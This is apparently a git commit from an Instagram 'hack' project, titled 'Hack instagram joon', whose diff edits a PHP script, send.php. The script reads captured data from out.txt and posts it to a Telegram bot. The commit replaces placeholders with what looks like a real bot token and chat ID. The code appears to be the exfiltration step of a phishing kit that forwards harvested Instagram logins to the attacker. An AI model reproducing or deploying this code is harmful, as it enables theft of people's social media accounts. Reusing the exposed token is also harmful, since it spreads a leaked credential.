672f05101846151c2de0335a65c49fb3ac2b3263
abol0124 <73657580+abol0124@users.noreply.github.com>
2020-10-29 19:31:13 +0330

    instagram
    Hack instagram joon

--- send.php
+++ send.php
@@ -1,5 +1,5 @@
 <?php
     sleep(2);
     $msg = urlencode(file_get_contents("out.txt"));
-    file_get_contents("https://api.telegram.org/botTOKEN/sendMessage?chat_id=CHATID&text=$msg");
+    file_get_contents("https://api.telegram.org/bot1305220137:AAELDuFI1-QAgfezGOBnW3KZ0d1Ol5boQrI/sendMessage?chat_id=1011363480&text=$msg");
 ?>
